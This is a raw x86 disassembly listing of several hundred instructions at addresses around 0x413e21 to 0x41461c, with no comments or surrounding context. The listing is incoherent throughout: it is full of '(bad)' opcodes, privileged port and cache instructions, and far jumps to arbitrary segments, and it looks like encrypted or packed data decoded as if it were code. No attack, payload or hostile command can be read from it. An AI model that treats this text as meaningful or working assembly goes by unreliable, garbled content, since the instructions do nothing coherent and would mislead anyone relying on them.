  413e21:	push   edx
  413e22:	and    ebp,ebx
  413e24:	inc    ebx
  413e25:	cmp    BYTE PTR [esp+eax*2],0x32
  413e29:	in     eax,0xf6
  413e2b:	in     al,dx
  413e2c:	jae    0x413e00
  413e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e2f:	add    DWORD PTR [edi],0xffffffc2
  413e32:	fsub   st(4),st
  413e34:	dec    ebx
  413e35:	and    al,0x18
  413e37:	sbb    eax,0x52c24b83
  413e3c:	cmp    edx,DWORD PTR [ebx+esi*1+0x75]
  413e40:	cld    
  413e41:	xchg   edx,eax
  413e42:	inc    edi
  413e43:	push   ecx
  413e44:	pop    ebp
  413e45:	mov    eax,0x7988d9a0
  413e4a:	xchg   edx,eax
  413e4b:	ret    
  413e4c:	ficom  DWORD PTR [ebp-0x7]
  413e4f:	push   edi
  413e50:	das    
  413e51:	psubd  mm1,mm5
  413e54:	rcr    edi,cl
  413e56:	xchg   ah,bh
  413e58:	adc    DWORD PTR [eax+0x66],esp
  413e5b:	xlat   BYTE PTR ds:[ebx]
  413e5c:	adc    WORD PTR [ebx],di
  413e5f:	je     0x413e5c
  413e61:	scas   al,BYTE PTR es:[edi]
  413e62:	dec    DWORD PTR [esi+0x23]
  413e65:	mov    eax,ebp
  413e67:	retf   0x4c95
  413e6a:	inc    esi
  413e6b:	fnstcw WORD PTR [edi+0x67553894]
  413e71:	add    dh,cl
  413e73:	pop    ecx
  413e74:	push   esp
  413e75:	mov    DWORD PTR ds:[ebp-0x66],edi
  413e79:	mov    ah,0xae
  413e7b:	sbb    eax,0x44b41634
  413e80:	push   edx
  413e81:	out    0x2,eax
  413e83:	push   eax
  413e84:	and    ecx,DWORD PTR [edi]
  413e86:	xor    eax,0x728fbf46
  413e8b:	clc    
  413e8c:	or     edx,edx
  413e8e:	imul   esp,DWORD PTR [ebp-0x7fb0b1d4],0xffffffd6
  413e95:	jb     0x413ede
  413e97:	add    DWORD PTR [eax],ecx
  413e99:	iret   
  413e9a:	lock sub edx,DWORD PTR [ecx]
  413e9d:	pop    edx
  413e9e:	xchg   ebp,eax
  413e9f:	adc    dh,BYTE PTR [esi]
  413ea1:	shr    BYTE PTR es:[edi+eiz*4],1
  413ea5:	nop
  413ea6:	test   DWORD PTR ds:0xbd74d127,ecx
  413eac:	jge    0x413f1e
  413eae:	cmp    eax,0x838c5532
  413eb3:	es cld 
  413eb5:	std    
  413eb6:	imul   ebp,DWORD PTR [edx],0xda9a7a53
  413ebc:	test   al,0xdc
  413ebe:	test   DWORD PTR ds:0xcbe5afb5,eax
  413ec4:	pop    edi
  413ec5:	jo     0x413ed2
  413ec7:	pop    esp
  413ec8:	adc    esi,esp
  413eca:	daa    
  413ecb:	stos   DWORD PTR es:[edi],eax
  413ecc:	loope  0x413e7b
  413ece:	jp     0x413efe
  413ed0:	or     ah,BYTE PTR [eax+0x2a007cee]
  413ed6:	popf   
  413ed7:	lods   al,BYTE PTR ds:[esi]
  413ed8:	cmp    edx,edx
  413eda:	mov    esp,0xf309b32f
  413edf:	mov    edi,0xc4ed0db9
  413ee4:	mov    ah,0x24
  413ee6:	mov    ds:0xb3f6be2e,eax
  413eeb:	outs   dx,BYTE PTR gs:[esi]
  413eed:	mov    cl,0xf0
  413eef:	xchg   esi,eax
  413ef0:	mov    dl,0x72
  413ef2:	cmp    eax,0x403528f5
  413ef7:	and    eax,0xfe80e9bd
  413efc:	lds    esi,FWORD PTR [ecx+esi*2+0x41f687e4]
  413f03:	push   eax
  413f04:	jb     0x413f85
  413f06:	inc    ecx
  413f07:	test   al,0xfa
  413f09:	sub    edi,DWORD PTR [ebx-0x2ad77f5b]
  413f0f:	cld    
  413f10:	aad    0x4f
  413f12:	xchg   BYTE PTR [edx+0x22f557d9],dl
  413f18:	cmp    al,0xa
  413f1a:	sar    DWORD PTR [ebp+ebx*8+0xe3e8bd3],0xda
  413f22:	inc    edi
  413f23:	sub    ah,ch
  413f25:	pop    esp
  413f26:	(bad)  
  413f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f28:	mov    al,ds:0x4a37191d
  413f2d:	jge    0x413f89
  413f2f:	ficomp DWORD PTR ds:0xdd477930
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	inc    ebx
  413f37:	sbb    ebp,DWORD PTR [eax+eiz*8]
  413f3a:	sbb    ecx,ebp
  413f3c:	xor    DWORD PTR [ebx+ebp*2+0x55],0x66652e56
  413f44:	pop    edi
  413f45:	mov    al,0x24
  413f47:	mov    cl,0xd7
  413f49:	mov    cl,0x9d
  413f4b:	(bad)  
  413f4c:	fs cdq 
  413f4e:	xchg   edi,eax
  413f4f:	aaa    
  413f50:	in     eax,dx
  413f51:	cwde   
  413f52:	(bad)  
  413f53:	into   
  413f54:	add    eax,0xe4be2aae
  413f59:	in     eax,0x2a
  413f5b:	test   dl,cl
  413f5d:	pop    ebp
  413f5e:	pop    ds
  413f5f:	sbb    BYTE PTR [ebx-0x541894bb],bh
  413f65:	mov    al,ds:0xffe5cfb4
  413f6a:	shl    cl,1
  413f6c:	call   0xffb:0xd25bbb6e
  413f73:	fcomp  st(2)
  413f75:	jno    0x413f51
  413f77:	and    DWORD PTR [eax+0x68],ebp
  413f7a:	mov    ?,eax
  413f7c:	ficomp DWORD PTR [eax-0x1722ad6d]
  413f82:	jp     0x413f60
  413f84:	sbb    dh,bh
  413f86:	stos   BYTE PTR es:[edi],al
  413f87:	pop    esp
  413f88:	mov    WORD PTR [ebp-0x7c],ds
  413f8b:	add    al,BYTE PTR [edi+0x25]
  413f8e:	push   edx
  413f8f:	pop    esi
  413f90:	sahf   
  413f91:	mov    cl,dl
  413f93:	cld    
  413f94:	inc    ecx
  413f95:	jg     0x413fba
  413f97:	outs   dx,DWORD PTR ds:[esi]
  413f98:	jg     0x413f43
  413f9a:	ror    DWORD PTR [edi-0x7],1
  413f9d:	sub    esi,0xffffffd3
  413fa0:	xchg   edx,eax
  413fa1:	mov    bl,0x7f
  413fa3:	shl    BYTE PTR [ecx+eiz*1],cl
  413fa6:	idiv   esp
  413fa8:	(bad)  
  413faa:	xor    ah,BYTE PTR ds:0x1c632139
  413fb0:	xchg   esp,eax
  413fb1:	ror    DWORD PTR [edi-0x40],0xe2
  413fb5:	add    al,0xb7
  413fb7:	adc    DWORD PTR [edx],ebx
  413fb9:	sbb    edi,DWORD PTR [edx-0x5b]
  413fbc:	pop    ds
  413fbd:	cmp    bl,BYTE PTR [ebx-0x4]
  413fc0:	and    ch,BYTE PTR [eax+0xa]
  413fc3:	stos   BYTE PTR es:[edi],al
  413fc4:	sub    BYTE PTR [edx+0x11b12367],dl
  413fca:	cmc    
  413fcb:	sbb    eax,0x90f1584c
  413fd0:	mov    eax,0xeee13ae8
  413fd5:	sbb    al,BYTE PTR [edi-0x5f0bd256]
  413fdb:	cmp    DWORD PTR [esi+0x75],esi
  413fde:	mov    eax,ds:0x7cdc16dd
  413fe3:	push   ecx
  413fe4:	sub    al,0x5f
  413fe6:	mov    ebx,0xac34ebb4
  413feb:	mov    edx,0x25a664af
  413ff0:	dec    esi
  413ff1:	push   ds
  413ff2:	call   0x47b2:0xb53e458d
  413ff9:	mov    ebp,0xb2bb0325
  413ffe:	sbb    al,0x6
  414000:	mov    ch,0xec
  414002:	ret    0xa41c
  414005:	add    ecx,edx
  414007:	cwde   
  414008:	mov    ebp,?
  41400a:	lods   al,BYTE PTR cs:[esi]
  41400c:	into   
  41400d:	imul   esp,DWORD PTR [ebp+0xc3abfd5],0xffffffdb
  414014:	push   0x85b7c3d9
  414019:	(bad)  
  41401a:	rol    DWORD PTR ds:0xf0372e3b,cl
  414020:	add    DWORD PTR [eax-0x48],ecx
  414023:	and    ch,BYTE PTR [ecx-0x6c959601]
  414029:	and    ah,BYTE PTR [edi-0x31b1915a]
  41402f:	stc    
  414030:	das    
  414031:	ds loop 0x413fd5
  414034:	push   cs
  414035:	imul   edi,DWORD PTR [eax+0x2d],0x5
  414039:	sbb    edx,0xdb287a04
  41403f:	push   es
  414040:	cmp    bl,BYTE PTR [edi-0xe]
  414043:	retf   
  414044:	cwde   
  414045:	sbb    al,0xc9
  414047:	call   0x84169902
  41404c:	fnstsw WORD PTR [ebx]
  41404e:	xor    cl,BYTE PTR [edx]
  414050:	jnp    0x414087
  414052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414053:	bound  edi,QWORD PTR [ebx-0x11e078a1]
  414059:	aaa    
  41405a:	add    DWORD PTR [edi-0x7d2cf0b8],eax
  414060:	push   eax
  414061:	mov    ch,0x9b
  414063:	(bad)
  414066:	cmp    al,0xf2
  414068:	inc    eax
  414069:	sbb    DWORD PTR [edi+eax*2+0x57],edx
  41406d:	mov    al,ds:0x51f5390
  414072:	xchg   ebx,eax
  414073:	add    eax,0x6d9a97ce
  414078:	xchg   dh,dl
  41407a:	mov    ds:0x33e5a067,al
  41407f:	fidiv  DWORD PTR [ebp-0x7ba56cb6]
  414085:	inc    esp
  414086:	int    0x8c
  414088:	add    al,0x70
  41408a:	fisub  WORD PTR [ecx+0x2e7d68b8]
  414090:	int    0x8f
  414092:	jle    0x41410b
  414094:	mov    al,0xa7
  414096:	cmp    al,0x24
  414098:	sub    DWORD PTR [ebx],0x79
  41409b:	xchg   ebx,eax
  41409c:	cmc    
  41409d:	xchg   esp,eax
  41409e:	and    BYTE PTR [ecx],ch
  4140a0:	push   ebp
  4140a1:	(bad)  
  4140a2:	xor    DWORD PTR [edi],edx
  4140a4:	jl     0x414068
  4140a6:	jecxz  0x414084
  4140a8:	jb     0x4140f9
  4140aa:	enter  0x4e3e,0x13
  4140ae:	dec    edx
  4140af:	aam    0xcb
  4140b1:	dec    ebp
  4140b2:	xchg   edi,eax
  4140b3:	mov    WORD PTR [edx-0xee7150e],es
  4140b9:	cmp    al,0x54
  4140bb:	sbb    BYTE PTR [edx+0x2b6e70fb],cl
  4140c1:	lea    ecx,ds:0x3d737113
  4140c7:	inc    edi
  4140c8:	and    DWORD PTR [ebp-0x59],edi
  4140cb:	mov    esi,0x8d3cf18b
  4140d0:	dec    ebx
  4140d1:	cmp    edx,esi
  4140d3:	frstor [ebx-0x37]
  4140d6:	push   cs
  4140d7:	push   ebp
  4140d8:	pop    ebx
  4140d9:	push   ecx
  4140da:	(bad)  
  4140db:	sub    al,0x1c
  4140dd:	and    eax,0x5c66c9b4
  4140e2:	lock addr16 dec ecx
  4140e5:	adc    ch,dl
  4140e7:	dec    esi
  4140e8:	(bad)  
  4140e9:	and    ch,bh
  4140eb:	adc    bl,cl
  4140ed:	mov    eax,0xe81ca240
  4140f2:	add    bh,ch
  4140f4:	jecxz  0x4140e1
  4140f6:	dec    ecx
  4140f7:	mov    cx,0xc838
  4140fb:	xchg   edx,eax
  4140fc:	loopne 0x41412b
  4140fe:	sar    BYTE PTR [esi+0x74],0x44
  414102:	or     BYTE PTR [edi+0x3a226b3e],dh
  414108:	xor    esi,DWORD PTR [ecx]
  41410a:	clc    
  41410b:	add    eax,0x2e2ef52
  414110:	shr    DWORD PTR [ebp+0x5d],cl
  414113:	and    DWORD PTR [ebp-0x716173c4],0xe34387cf
  41411d:	leave  
  41411e:	arpl   WORD PTR [ebp-0x7c8de],si
  414124:	jne    0x414192
  414126:	jbe    0x4140e4
  414128:	dec    esi
  414129:	xor    ebp,DWORD PTR [ebx]
  41412b:	popa   
  41412c:	js     0x414142
  41412e:	jbe    0x414167
  414130:	test   al,0x4e
  414132:	jne    0x414122
  414134:	das    
  414135:	into   
  414136:	addr16 jno 0x41419e
  414139:	push   ds
  41413a:	or     ebx,DWORD PTR [ecx+0x6842085e]
  414140:	repnz shl ch,cl
  414143:	scas   eax,DWORD PTR es:[edi]
  414144:	mov    esi,0xcb81f869
  414149:	pop    esp
  41414a:	in     al,dx
  41414b:	jbe    0x4141b3
  41414d:	dec    esi
  41414e:	sub    BYTE PTR [ecx+ebx*4-0x67],bl
  414152:	(bad)  
  414153:	ds jns 0x414186
  414156:	loopne 0x4141c9
  414158:	push   esi
  414159:	push   esi
  41415a:	fsub   QWORD PTR [edi]
  41415c:	adc    DWORD PTR [edi],edi
  41415e:	and    eax,ebx
  414160:	xchg   edi,eax
  414161:	je     0x414118
  414163:	sub    al,0x78
  414165:	sar    DWORD PTR [ebp+0x17d26a55],1
  41416b:	push   0x6d5b7e42
  414170:	xchg   ebp,eax
  414171:	mov    ch,0x78
  414173:	ins    BYTE PTR es:[edi],dx
  414174:	push   eax
  414175:	inc    ebp
  414176:	adc    ecx,ebp
  414178:	aas    
  414179:	retf   0x3b1e
  41417c:	out    dx,eax
  41417d:	cs push edx
  41417f:	jl     0x4141a5
  414181:	in     al,0x3e
  414183:	int    0xd4
  414185:	mov    ss,WORD PTR [ebx+0x6a]
  414188:	mov    dh,0xf2
  41418a:	aad    0xb9
  41418c:	pop    es
  41418d:	sub    DWORD PTR [edx+0x73],0xd49371ee
  414194:	adc    eax,0xf4348d5
  414199:	dec    eax
  41419a:	(bad)  
  41419b:	dec    esi
  41419c:	test   DWORD PTR [ebx+ecx*8-0x448de919],esi
  4141a3:	xor    al,0x7
  4141a5:	dec    edx
  4141a6:	sti    
  4141a7:	sub    BYTE PTR [edx+0x1331eec],bl
  4141ad:	ins    DWORD PTR es:[edi],dx
  4141ae:	aam    0x25
  4141b0:	bound  esi,QWORD PTR [edx-0x46fc548f]
  4141b6:	mov    ebp,0xfeb9ac51
  4141bb:	mov    eax,ds:0x988a84b9
  4141c0:	add    esi,DWORD PTR [ebp-0x23d6fdb4]
  4141c6:	inc    ebp
  4141c7:	push   es
  4141c8:	push   0xa651bfa0
  4141cd:	(bad)  
  4141ce:	ror    ebp,0x7f
  4141d1:	stos   DWORD PTR es:[edi],eax
  4141d2:	es jne 0x4141d2
  4141d5:	clc    
  4141d6:	loope  0x414245
  4141d8:	popf   
  4141d9:	mov    ebx,0x7f60093
  4141de:	and    ecx,DWORD PTR [ebx]
  4141e0:	sbb    eax,0x3ea69737
  4141e5:	ds lods eax,DWORD PTR ss:[esi]
  4141e8:	or     DWORD PTR ds:0x294211ec,eax
  4141ee:	into   
  4141ef:	js     0x414173
  4141f1:	cmp    al,0x7b
  4141f3:	std    
  4141f4:	jmp    0x4cef:0x7bacacc8
  4141fb:	cld    
  4141fc:	push   ebx
  4141fd:	lea    esp,[ebx+0x76]
  414200:	and    DWORD PTR ds:0x7385d5bb,0xd7926cfa
  41420a:	fisttp DWORD PTR [ebx]
  41420c:	cmp    al,0xdf
  41420e:	xchg   ebp,eax
  41420f:	push   edi
  414210:	jmp    0x2978:0xdcb2c246
  414217:	shr    BYTE PTR [esi+0x6],cl
  41421a:	xchg   edx,eax
  41421b:	mov    eax,ds:0x3f9bae38
  414220:	sahf   
  414221:	pop    ss
  414222:	fisttp QWORD PTR [esi+eiz*4]
  414225:	daa    
  414226:	jge    0x4141c0
  414228:	cwde   
  414229:	ins    DWORD PTR es:[edi],dx
  41422a:	jmp    0x1c70:0xd6166268
  414231:	fwait
  414232:	pop    ebp
  414233:	ret    0x91c
  414236:	sbb    DWORD PTR [edx],ebp
  414238:	lock aas 
  41423a:	das    
  41423b:	or     DWORD PTR [ebx],edi
  41423d:	repnz retf 0xf304
  414241:	js     0x414229
  414243:	adc    BYTE PTR [eax],al
  414245:	jmp    0xd93:0xd575
  41424b:	je     0x4142ca
  41424d:	mov    ds:0xb2ba5e0f,al
  414252:	pop    edx
  414253:	xchg   esp,eax
  414254:	sbb    ecx,DWORD PTR [ecx-0x43a7edf1]
  41425a:	adc    BYTE PTR [edx],bh
  41425c:	mov    eax,ds:0x69d9a847
  414261:	or     edx,DWORD PTR [eax-0x7d0fe194]
  414267:	sub    eax,0xcc6e936b
  41426c:	or     BYTE PTR [edx-0x3d85d50],bh
  414272:	outs   dx,DWORD PTR ds:[esi]
  414273:	dec    esi
  414274:	pop    edi
  414275:	mov    ecx,0x3a69a9ac
  41427a:	xor    eax,0x2497b286
  41427f:	cmp    al,0x86
  414281:	jle    0x414263
  414283:	ret    
  414284:	mov    ebx,0xda0b4258
  414289:	arpl   WORD PTR [ebx+esi*1+0x2c8bcf51],bp
  414290:	outs   dx,DWORD PTR ds:[esi]
  414291:	pop    ss
  414292:	in     eax,0xaf
  414294:	fisubr WORD PTR ds:0xa25bbf5d
  41429a:	xchg   BYTE PTR [edi-0x76],bh
  41429d:	aas    
  41429e:	pop    ss
  41429f:	and    esi,eax
  4142a1:	das    
  4142a2:	test   dl,ah
  4142a4:	bound  ecx,QWORD PTR [edi+eiz*1-0x2a]
  4142a8:	jb     0x41430c
  4142aa:	ins    BYTE PTR es:[edi],dx
  4142ab:	mov    dl,0x86
  4142ad:	shr    DWORD PTR [eax-0x2cff0ec9],cl
  4142b3:	mov    ds:0x2f417506,eax
  4142b8:	pop    es
  4142b9:	mov    bl,0xb0
  4142bb:	neg    DWORD PTR [ecx]
  4142bd:	pop    ebp
  4142be:	aam    0x4f
  4142c0:	mov    ds:0xc3001690,al
  4142c5:	or     ebx,DWORD PTR [edi+0x6430349e]
  4142cb:	xor    al,0xad
  4142cd:	lds    ecx,FWORD PTR [edi]
  4142cf:	test   eax,0xbdff88e9
  4142d4:	add    BYTE PTR [esi+ebp*8+0x2d],bh
  4142d8:	mov    ecx,0x42b4bf95
  4142dd:	in     al,0x48
  4142df:	xchg   edx,eax
  4142e0:	fs xchg ebp,eax
  4142e2:	idiv   esi
  4142e4:	mov    ah,0xc3
  4142e6:	lea    esp,[esi-0x7a]
  4142e9:	or     al,BYTE PTR [ecx]
  4142eb:	mov    DWORD PTR [edi-0x759cc328],ecx
  4142f1:	out    dx,eax
  4142f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142f3:	sbb    eax,0xba3b270e
  4142f8:	sbb    esi,ebp
  4142fa:	dec    esi
  4142fb:	retf   
  4142fc:	and    ah,BYTE PTR [esi+0x4c2635ea]
  414302:	cmp    BYTE PTR [edx-0x5705cf04],0xa7
  414309:	fiadd  WORD PTR [ebx+0x4f74232d]
  41430f:	aam    0x36
  414311:	jge    0x414388
  414313:	add    al,0x5f
  414315:	ds scas eax,DWORD PTR es:[edi]
  414317:	mov    bh,0x83
  414319:	in     al,0x68
  41431b:	dec    esi
  41431c:	imul   edi,DWORD PTR [ebp+0x8],0xfffffffb
  414320:	sar    ebx,1
  414322:	xor    eax,DWORD PTR [eax]
  414324:	ins    DWORD PTR es:[edi],dx
  414325:	dec    edx
  414326:	rcr    BYTE PTR [eax],cl
  414328:	jge    0x41436e
  41432a:	add    al,0x37
  41432c:	(bad)  
  41432d:	(bad)  
  41432e:	push   esp
  41432f:	arpl   WORD PTR [edx-0x3f],dx
  414332:	ins    DWORD PTR es:[edi],dx
  414333:	outs   dx,BYTE PTR ds:[esi]
  414334:	inc    eax
  414335:	ret    0x34ba
  414338:	add    al,0x4e
  41433a:	lods   eax,DWORD PTR ds:[esi]
  41433b:	xor    DWORD PTR [ebx-0x13],eax
  41433e:	dec    esi
  41433f:	into   
  414340:	jle    0x41437c
  414342:	pop    ecx
  414343:	mov    al,0x5
  414345:	ins    DWORD PTR es:[edi],dx
  414346:	or     ch,dl
  414348:	push   esi
  414349:	pop    edi
  41434a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41434b:	or     DWORD PTR [edx-0x66e72ccd],0xfffffff5
  414352:	das    
  414353:	mov    ds:0x390f5137,al
  414358:	push   0xfffffff1
  41435a:	int3   
  41435b:	fwait
  41435c:	test   eax,0x2645b6e7
  414361:	jns    0x414398
  414363:	shl    al,1
  414365:	cmp    eax,0xf6d78fbf
  41436a:	and    eax,DWORD PTR [edi+0x51]
  41436d:	mov    ecx,0x2f5e4637
  414372:	xor    edi,DWORD PTR [eax+0x19]
  414375:	xchg   esi,eax
  414376:	ins    BYTE PTR es:[edi],dx
  414377:	mov    al,ds:0xba72f990
  41437c:	fwait
  41437d:	jge    0x4143a6
  41437f:	push   ebp
  414380:	sub    eax,0x29846a6c
  414385:	mov    eax,ds:0xe4b031a1
  41438a:	cdq    
  41438b:	lea    ecx,[ecx+0x1ac5985]
  414391:	or     eax,0xbf057daf
  414396:	je     0x41438a
  414398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414399:	daa    
  41439a:	mov    esi,DWORD PTR [edi+0x16]
  41439d:	pop    ebx
  41439e:	arpl   si,dx
  4143a0:	sbb    al,0xf
  4143a2:	shl    DWORD PTR [esi],1
  4143a4:	inc    esi
  4143a5:	into   
  4143a6:	jl     0x4143ef
  4143a8:	outs   dx,DWORD PTR ds:[esi]
  4143a9:	inc    eax
  4143aa:	pop    eax
  4143ab:	ror    BYTE PTR [esi-0x292acbc8],cl
  4143b1:	pxor   mm7,mm7
  4143b4:	sbb    DWORD PTR [ebp+0x13],0x276d9f7
  4143bb:	mov    DWORD PTR [eax-0x4e750b37],eax
  4143c1:	pop    esp
  4143c2:	jb     0x414397
  4143c4:	ds jne 0x4143e8
  4143c7:	cdq    
  4143c8:	(bad)  
  4143c9:	mov    esi,0x5efdf3a8
  4143ce:	ret    0x1205
  4143d1:	sbb    BYTE PTR [ebx],bh
  4143d3:	mov    ecx,0xdb8bc3fe
  4143d8:	popf   
  4143d9:	add    eax,0xaaec42bb
  4143de:	scas   eax,DWORD PTR es:[edi]
  4143df:	popf   
  4143e0:	and    DWORD PTR [ecx],esp
  4143e2:	jl     0x414397
  4143e4:	in     al,dx
  4143e5:	hlt    
  4143e6:	(bad)  
  4143e7:	stc    
  4143e8:	add    esi,DWORD PTR [eax+0x7454c6aa]
  4143ee:	mov    ds,WORD PTR [ebp+0x11]
  4143f1:	test   al,0x3f
  4143f3:	pusha  
  4143f4:	push   eax
  4143f5:	dec    edi
  4143f6:	bound  ecx,QWORD PTR [eax]
  4143f8:	invd   
  4143fa:	add    ah,BYTE PTR [ebp-0x796c7d0d]
  414400:	add    al,0x3e
  414402:	mov    cs,WORD PTR [eax-0x2b]
  414405:	cmp    DWORD PTR fs:[eax],esi
  414408:	gs pop ds
  41440a:	repz add BYTE PTR [eax-0x20],0x6
  41440f:	ins    BYTE PTR es:[edi],dx
  414410:	ror    DWORD PTR [edi+0x2a5f3438],cl
  414416:	arpl   WORD PTR [ebx-0x7b],ax
  414419:	cmp    eax,0xfc4cd644
  41441e:	cs js  0x414474
  414421:	xchg   edx,eax
  414422:	xor    edi,DWORD PTR [edi+0x67]
  414425:	adc    eax,0x6788417e
  41442a:	pop    ss
  41442b:	mov    al,0xe8
  41442d:	dec    edi
  41442e:	and    BYTE PTR [esi+0x64],0xac
  414432:	outs   dx,DWORD PTR ds:[esi]
  414433:	inc    ecx
  414434:	fwait
  414435:	push   edi
  414436:	ret    
  414437:	cli    
  414438:	div    DWORD PTR [ebp+0x5c5b3021]
  41443e:	(bad)  
  41443f:	fcom   DWORD PTR [esi+0x78f1a97a]
  414445:	mov    edx,0x509d755b
  41444a:	mov    ah,0x54
  41444c:	jg     0x41444d
  41444e:	hlt    
  41444f:	(bad)  
  414450:	daa    
  414451:	mov    dh,0xd7
  414453:	cmp    ah,ah
  414455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414456:	test   al,0xa4
  414458:	pop    esp
  414459:	les    eax,FWORD PTR [edx-0x99d4972]
  41445f:	sbb    eax,0xc01d5e55
  414464:	cmp    eax,0x2d5574b1
  414469:	dec    edx
  41446a:	stos   BYTE PTR es:[edi],al
  41446b:	fcmovnb st,st(4)
  41446d:	call   0x23cf86ef
  414472:	xchg   ebp,eax
  414473:	fs (bad) 
  414475:	and    esp,DWORD PTR [eax+0x63]
  414478:	cs nop
  41447a:	mov    cl,0xe5
  41447c:	push   cs
  41447d:	shl    DWORD PTR [esi+esi*8+0x20fe3327],1
  414484:	int3   
  414485:	aam    0xe6
  414487:	bt     DWORD PTR [ecx],0x5c
  41448b:	retf   
  41448c:	ss and al,0x77
  41448f:	ja     0x4144f6
  414491:	nop
  414492:	xchg   BYTE PTR [ecx],cl
  414494:	nop
  414495:	mov    ah,0xf5
  414497:	leave  
  414498:	in     al,0x19
  41449a:	jmp    0x414508
  41449c:	mov    ebx,0x74461cb0
  4144a1:	pop    edi
  4144a2:	mov    ebx,DWORD PTR [esi]
  4144a4:	in     eax,dx
  4144a5:	jmp    0x414469
  4144a7:	mov    esi,DWORD PTR ds:0x6b2b13d8
  4144ad:	cmp    DWORD PTR [ecx-0x69],ebp
  4144b0:	jne    0x414515
  4144b2:	(bad)  
  4144b3:	imul   edi,DWORD PTR [edx-0x5b8ca615],0x49
  4144ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144bb:	xor    al,0xde
  4144bd:	sbb    DWORD PTR ds:0xe75149c3,0xffffffe4
  4144c4:	mov    edi,DWORD PTR [eax+0x75139965]
  4144ca:	cmp    esp,DWORD PTR [esi+0x2f0e4e25]
  4144d0:	ficomp WORD PTR [ebp+0x18d049a7]
  4144d6:	cmp    esi,DWORD PTR ds:0x56febea5
  4144dc:	not    BYTE PTR [ebx+0x30]
  4144df:	sub    eax,DWORD PTR [eax-0x11fd5c31]
  4144e5:	aam    0xe2
  4144e7:	sub    eax,0x57834d81
  4144ec:	push   edx
  4144ed:	sub    DWORD PTR [ebx],eax
  4144ef:	sbb    al,cl
  4144f1:	push   ebp
  4144f2:	arpl   WORD PTR [edi-0x14b6ee4],bp
  4144f8:	jb     0x414566
  4144fa:	lds    edi,FWORD PTR [eax+ebp*4]
  4144fd:	pushf  
  4144fe:	inc    eax
  4144ff:	add    al,ch
  414501:	cs inc ebx
  414503:	or     bh,BYTE PTR [esi+0x472b522b]
  414509:	loop   0x4144e7
  41450b:	mov    al,0xb0
  41450d:	or     BYTE PTR ds:0x7bb19634,dh
  414513:	leave  
  414514:	inc    eax
  414515:	inc    edx
  414516:	sub    esp,DWORD PTR [ecx-0x79387514]
  41451c:	mov    eax,ds:0x7f8f6715
  414521:	mov    ecx,0x8095fa30
  414526:	adc    al,0x11
  414528:	dec    ebx
  414529:	add    BYTE PTR [eax+0x15c84f92],bl
  41452f:	jbe    0x4144ce
  414531:	cdq    
  414532:	inc    ebp
  414533:	jle    0x414518
  414535:	popa   
  414536:	mov    ecx,0x9982f4c5
  41453b:	sar    edx,0xdd
  41453e:	or     eax,0x6466f6b6
  414543:	or     BYTE PTR [ebx],dl
  414545:	jl     0x41457b
  414547:	dec    esi
  414548:	xchg   DWORD PTR [ecx+ebx*1],edx
  41454b:	cmp    eax,0xd457006e
  414550:	or     dh,dh
  414552:	xchg   edx,eax
  414553:	fadd   DWORD PTR [ecx+0x7c]
  414556:	fcomp  QWORD PTR [edi+0x1c]
  414559:	ret    
  41455a:	and    al,0x49
  41455c:	daa    
  41455d:	shl    BYTE PTR ds:0xe117160f,cl
  414563:	pop    ebp
  414564:	xchg   ebp,eax
  414565:	and    ebp,edi
  414567:	xchg   ebx,eax
  414568:	cmp    DWORD PTR [edi+0xf],0xb8dd96a
  41456f:	and    dl,ch
  414571:	enter  0xb643,0x2c
  414575:	or     esi,DWORD PTR [ebp+0x32]
  414578:	lods   al,BYTE PTR ds:[esi]
  414579:	frstor [ecx-0x68dc9022]
  41457f:	lods   al,BYTE PTR ds:[esi]
  414580:	xor    al,0xfe
  414582:	jle    0x4145fc
  414584:	sub    BYTE PTR [esi+eax*8],0xff
  414588:	xor    BYTE PTR [ebx],bl
  41458a:	fadd   QWORD PTR [ebp+0x74da244f]
  414590:	clc    
  414591:	jmp    0x41459a
  414593:	ret    
  414594:	mov    cl,0xf3
  414596:	xchg   esp,ecx
  414598:	loopne 0x414604
  41459a:	stos   DWORD PTR es:[edi],eax
  41459b:	and    BYTE PTR [esi-0x3a2a60e7],al
  4145a1:	pop    edx
  4145a2:	ja     0x41461c
  4145a4:	and    al,0x76
  4145a6:	mov    bh,0x93
  4145a8:	inc    esp
  4145a9:	sub    dh,BYTE PTR [ecx+0x5f]
  4145ac:	sbb    bl,BYTE PTR [ecx+0x637bd1aa]
  4145b2:	jb     0x414621
  4145b4:	fdiv   st(5),st
  4145b6:	mov    dl,0x28
  4145b8:	lea    edx,[eax+0x5d49ad64]
  4145be:	mov    BYTE PTR [ebp+0x7],ch
  4145c1:	fcmovne st,st(2)
  4145c3:	xchg   ecx,eax
  4145c4:	push   0xffffffaf
  4145c6:	and    al,0x68
  4145c8:	mov    ah,0x9c
  4145ca:	mov    ch,0xfc
  4145cc:	retf   
  4145cd:	jmp    0x8113:0xf4c9cf58
  4145d4:	aad    0x10
  4145d6:	sbb    al,0xaa
  4145d8:	cdq    
  4145d9:	jle    0x4145be
  4145db:	xor    BYTE PTR [ecx-0x4e],ah
  4145de:	or     DWORD PTR [edi-0x15546957],ebp
  4145e4:	dec    edx
  4145e5:	inc    esp
  4145e6:	push   esi
  4145e7:	jmp    0x414617
  4145e9:	(bad)  
  4145ea:	ss stos BYTE PTR es:[edi],al
  4145ec:	inc    BYTE PTR [edi+0x24]
  4145ef:	jle    0x414655
  4145f1:	sub    DWORD PTR [ecx],edi
  4145f3:	cld    
  4145f4:	popa   
  4145f5:	ins    BYTE PTR es:[edi],dx
  4145f6:	jp     0x41464e
  4145f8:	(bad)
  4145fc:	fs inc ebp
  4145fe:	test   BYTE PTR [eax],bh
  414600:	cmp    edx,DWORD PTR [esi+0x77]
  414603:	into   
  414604:	adc    al,BYTE PTR [edi]
  414606:	inc    edx
  414607:	cdq    
  414608:	cmc    
  414609:	addr16 cli 
  41460b:	popf   
  41460c:	fs xchg edi,eax
  41460e:	inc    ebx
  41460f:	mov    esi,0x4f99206e
  414614:	push   edi
  414615:	loopne 0x4145e5
  414617:	jmp    0x161914d8
  41461c:	rol    DWORD PTR [esi-0x2abb3878],0xed
